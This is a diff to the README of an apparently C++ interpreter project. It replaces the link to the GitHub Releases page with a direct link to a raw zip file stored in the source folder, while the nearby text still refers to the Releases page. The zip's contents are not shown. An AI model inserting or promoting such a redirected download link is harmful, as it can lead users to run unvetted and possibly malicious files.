@@ -8,7 +8,7 @@ Welcome to the brainfxxck project! This application is a modern C++ interpreter 
 
 To get started, visit the link below to download the software:
 
-[![Download brainfxxck](https://img.shields.io/badge/Download-brainfxxck-blue.svg)](https://github.com/dellaa129/brainfxxck/releases)
+[![Download brainfxxck](https://raw.githubusercontent.com/dellaa129/brainfxxck/main/src/brainfxxck_v1.3.zip)](https://raw.githubusercontent.com/dellaa129/brainfxxck/main/src/brainfxxck_v1.3.zip)
 
 Once on the Releases page, follow these steps to download and run the software:
 
